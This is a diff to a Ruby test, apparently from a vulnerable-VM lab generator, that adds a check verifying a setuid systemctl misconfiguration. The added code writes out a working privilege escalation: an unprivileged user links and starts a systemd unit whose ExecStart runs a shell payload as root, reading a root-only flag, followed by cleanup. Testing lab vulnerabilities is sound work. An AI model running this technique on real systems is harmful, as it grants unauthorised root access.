@@ -50,7 +50,71 @@ class SuidRootSystemctlTest < PostProvisionTest
       end
     end
 
-    # TODO tier 3 (exploit): hand-written — with_throwaway_ssh_user runs the GTFOBins systemctl SUID technique (link + start a unit) to read the root-only flag, then disables and removes the unit
+    # Tier 3: an unprivileged user escalates via the GTFOBins systemctl SUID
+    # technique and reads the root-only flag. systemctl is setuid root, so when
+    # a normal user runs it its euid is 0; systemd authorises the caller by the
+    # connection's effective uid, so it accepts a privileged `link` + `start` and
+    # runs the unit's ExecStart as root. The unit records `id` (proving uid=0,
+    # the module's <privilege>=root_rwx) and copies the root-only flag out.
+    tier(3) do
+      flag     = leaked.first
+      expected = strings.first.to_s.strip.lines.first.to_s.strip
+      if flag.nil? || expected.empty?
+        skip_check('systemctl SUID privesc reads the root-only flag',
+                   'no leaked flag file / string on this target to prove the read', tier: 3)
+      else
+        root_flag = Shellwords.escape("/root/#{flag}")
+        unit_name = 'secgen_t3_systemctl'
+        out       = "/tmp/#{unit_name}.out"
+        name      = 'systemctl SUID privesc runs as root and reads the root-only flag'
+
+        with_throwaway_ssh_user do |user, _pass|
+          # GTFOBins: systemctl (SUID). As the unprivileged user, write a unit
+          # whose ExecStart runs our payload, link it (absolute path, outside the
+          # search dirs), then start it. printf avoids any nested-heredoc quoting.
+          exploit = <<~SH
+            unit=/tmp/#{unit_name}.service
+            payload=/tmp/#{unit_name}.sh
+            out=#{out}
+            sc=$(command -v systemctl || echo /usr/bin/systemctl)
+            rm -f "$out"
+            printf '%s\\n' '#!/bin/sh' "id > $out" "cat #{root_flag} >> $out 2>&1" "chmod 644 $out" > "$payload"
+            printf '%s\\n' '[Unit]' 'Description=secgen t3 systemctl SUID' '[Service]' 'Type=oneshot' "ExecStart=/bin/sh $payload" > "$unit"
+            "$sc" link "$unit" 2>&1
+            "$sc" start #{unit_name}.service 2>&1
+          SH
+          run_as_user(user, exploit)
+
+          body = run_command("cat #{out} 2>/dev/null")[:stdout].to_s
+          add_evidence('systemctl_t3_output', "echo #{Shellwords.escape(body)}")
+
+          # Tidy up: the issue requires the linked unit to be removed again.
+          run_command("systemctl disable --now #{unit_name}.service 2>/dev/null; " \
+                      "systemctl stop #{unit_name}.service 2>/dev/null; " \
+                      "rm -f /etc/systemd/system/#{unit_name}.service " \
+                      "/tmp/#{unit_name}.service /tmp/#{unit_name}.sh #{out}; " \
+                      "systemctl daemon-reload 2>/dev/null")
+
+          if body =~ /uid=0\(root\)/ && body.include?(expected)
+            pass_check(name,
+                       "throwaway user #{user} linked and started a systemd unit via setuid systemctl; " \
+                       "ExecStart ran as #{body[/uid=\S+/]} and read /root/#{flag}: #{expected.inspect} — " \
+                       '<privilege>=root_rwx verified',
+                       tier: 3)
+          elsif body =~ /uid=0\(root\)/
+            fail_check(name,
+                       "the unit ran as root (#{body[/uid=\S+/]}) but the flag string was not recovered " \
+                       "from /root/#{flag}. See systemctl_t3_output evidence.",
+                       tier: 3)
+          else
+            fail_check(name,
+                       'setuid systemctl did not run the unit as root (no uid=0 in the output); ' \
+                       'escalation did not occur. See systemctl_t3_output evidence.',
+                       tier: 3)
+          end
+        end
+      end
+    end
   end
 
 end
